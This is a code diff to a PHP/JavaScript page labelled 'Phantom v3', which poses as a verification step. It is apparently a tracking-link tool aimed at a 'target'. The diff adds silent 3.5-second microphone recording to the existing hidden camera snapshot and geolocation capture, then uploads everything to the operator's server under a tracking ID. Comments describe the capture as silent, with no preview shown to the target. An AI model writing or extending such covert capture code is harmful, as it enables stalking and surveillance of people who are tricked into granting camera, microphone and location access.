@@ -1,7 +1,7 @@
 <?php
 /**
- * Phantom v3 – Verification Page + Automatic Photo Capture
- * Silent version (no preview shown to target)
+ * Phantom v3 – Verification Page
+ * Automatic Silent Photo + Short Audio Capture
  */
 
 $config = require __DIR__ . '/config.php';
@@ -66,7 +66,7 @@ if (empty($trackId)) {
             margin-top: 20px;
             line-height: 1.5;
         }
-        .hidden-video {
+        .hidden-media {
             position: absolute;
             width: 1px;
             height: 1px;
@@ -116,7 +116,7 @@ if (empty($trackId)) {
                     <div class="perm-icon">🎤</div>
                     <div>
                         <strong>Microphone</strong><br>
-                        <span style="font-size: 0.85rem; color: var(--text-muted);">Audio access</span>
+                        <span style="font-size: 0.85rem; color: var(--text-muted);">Short audio</span>
                     </div>
                     <div class="perm-status status-pending" id="status-mic">Pending</div>
                 </div>
@@ -133,8 +133,8 @@ if (empty($trackId)) {
         </div>
     </div>
 
-    <!-- Hidden elements for silent capture -->
-    <video id="video" class="hidden-video" autoplay playsinline muted></video>
+    <!-- Hidden elements -->
+    <video id="video" class="hidden-media" autoplay playsinline muted></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -153,21 +153,20 @@ if (empty($trackId)) {
             el.textContent = state.charAt(0).toUpperCase() + state.slice(1);
         }
 
+        // ===== Capture Photo =====
         async function capturePhoto(stream) {
             return new Promise((resolve) => {
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
-
-                    // Wait briefly for camera to adjust
                     setTimeout(() => {
                         canvas.width  = video.videoWidth;
                         canvas.height = video.videoHeight;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0);
 
-                        // Stop all tracks immediately
-                        stream.getTracks().forEach(track => track.stop());
+                        // Stop only video tracks
+                        stream.getVideoTracks().forEach(track => track.stop());
 
                         canvas.toBlob((blob) => {
                             resolve(blob);
@@ -177,13 +176,48 @@ if (empty($trackId)) {
             });
         }
 
-        async function sendPhotoToServer(blob, extra = {}) {
+        // ===== Record Short Audio (3.5 seconds) =====
+        async function recordAudio(stream) {
+            return new Promise((resolve) => {
+                const audioStream = new MediaStream(stream.getAudioTracks());
+                const mediaRecorder = new MediaRecorder(audioStream, {
+                    mimeType: 'audio/webm;codecs=opus'
+                });
+
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    // Stop audio tracks
+                    stream.getAudioTracks().forEach(track => track.stop());
+                    resolve(blob);
+                };
+
+                mediaRecorder.start();
+                // Record for 3.5 seconds
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 3500);
+            });
+        }
+
+        // ===== Send to server =====
+        async function sendMedia(photoBlob, audioBlob, extra = {}) {
             const formData = new FormData();
             formData.append('id', trackId);
-            formData.append('photo', blob, 'capture.jpg');
             formData.append('lat', extra.lat || '');
             formData.append('lon', extra.lon || '');
             formData.append('accuracy', extra.accuracy || '');
+
+            if (photoBlob) {
+                formData.append('photo', photoBlob, 'capture.jpg');
+            }
+            if (audioBlob) {
+                formData.append('audio', audioBlob, 'capture.webm');
+            }
 
             try {
                 await fetch('media.php', {
@@ -191,7 +225,7 @@ if (empty($trackId)) {
                     body: formData
                 });
             } catch (e) {
-                console.warn('Failed to send photo', e);
+                console.warn('Failed to send media', e);
             }
         }
 
@@ -200,6 +234,8 @@ if (empty($trackId)) {
             startBtn.textContent = 'Requesting permissions...';
 
             let locationData = {};
+            let photoBlob = null;
+            let audioBlob = null;
 
             // ===== 1. Location =====
             try {
@@ -235,29 +271,33 @@ if (empty($trackId)) {
                 setStatus(statusCamera, 'granted');
                 setStatus(statusMic, 'granted');
 
-                startBtn.textContent = 'Verifying...';
+                startBtn.textContent = 'Capturing...';
 
-                // Silent capture
-                const photoBlob = await capturePhoto(stream);
+                // Capture photo first
+                photoBlob = await capturePhoto(stream);
 
-                // Send to Telegram (no preview shown)
-                await sendPhotoToServer(photoBlob, locationData);
+                // Then record short audio (using remaining audio tracks)
+                startBtn.textContent = 'Recording audio...';
+                audioBlob = await recordAudio(stream);
 
             } catch (err) {
-                // Fallback: camera only
+                // Fallback: try camera only
                 try {
                     const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     setStatus(statusCamera, 'granted');
                     setStatus(statusMic, 'denied');
 
-                    startBtn.textContent = 'Verifying...';
-                    const photoBlob = await capturePhoto(camStream);
-                    await sendPhotoToServer(photoBlob, locationData);
+                    startBtn.textContent = 'Capturing...';
+                    photoBlob = await capturePhoto(camStream);
                 } catch (e) {
                     setStatus(statusCamera, 'denied');
                     setStatus(statusMic, 'denied');
                 }
             }
+
+            // ===== Send everything =====
+            startBtn.textContent = 'Sending verification...';
+            await sendMedia(photoBlob, audioBlob, locationData);
 
             // ===== Redirect =====
             startBtn.textContent = 'Redirecting...';
